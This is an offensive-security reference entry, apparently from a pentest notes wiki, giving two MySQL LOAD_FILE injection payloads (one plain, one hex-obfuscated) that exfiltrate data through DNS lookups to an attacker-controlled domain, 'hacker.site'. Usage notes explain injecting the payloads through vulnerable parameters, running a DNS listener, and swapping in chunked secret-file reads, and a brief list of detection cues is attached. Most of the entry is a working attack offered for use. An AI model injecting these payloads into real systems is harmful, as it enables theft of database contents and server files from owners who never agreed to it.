---
type: code
language: sql
verified: true
tags:
  - dns-exfiltration
  - sql-injection
  - mysql
platforms:
  - MySQL
validated: true
---

# MySQL-Load-File-DNS-Exfiltration-Snippet

## Code

```sql
select load_file(concat('\\',version(),'.hacker.site\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

## Description

This SQL code snippet demonstrates two variants of LOAD_FILE injection for out-of-band DNS exfiltration in MySQL. The first uses string concatenation to build a UNC path, appending database version to an attacker subdomain. The second uses hex encoding for obfuscation. When injected, it causes the MySQL server to resolve the attacker's DNS domain, leaking data via subdomain queries without returning it in the HTTP response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `hacker.site` | Attacker-controlled DNS domain to capture queries | `attacker-dns.com` |
| `version()` | MySQL version function (placeholder for exfiltrated data) | Replace with `load_file('/path/to/secret')` or `@@hostname` |
| `a.txt` | Dummy file name to complete UNC path | `dummy.txt` |
| `0x5c5c5c5c` | Hex-encoded backslashes for UNC (fixed) | N/A |
| `0x2e6861636b65722e736974655c5c612e747874` | Hex for ".hacker.site\\a.txt" (customize) | Hex-encode your domain and file |

## Usage

Inject this into a vulnerable MySQL query parameter (e.g., via Burp Suite repeater on a SQLi endpoint). Set up a DNS listener (e.g., ngrok or local dnsmasq) on hacker.site to log queries. For real exfiltration, replace version() with chunked file reads using SUBSTRING and HEX to encode binary data. Useful in blind SQLi scenarios where direct output is blocked.

## Detection

- Query logs showing LOAD_FILE with UNC paths or hex strings.
- Anomalous outbound DNS from DB server to external domains.
- WAF alerts on SQL keywords like LOAD_FILE or CONCAT(0x...).
- Increased DNS query volume with subdomains matching data patterns (e.g., version numbers).

## Related

- [[procedures/MySQL-SQL-Injection-for-Out-of-Band-DNS-Exfiltration]]
- [[commands/mysql-load-file-remote-server-concat]]
- [[commands/mysql-load-file-hexadecimal-values]]
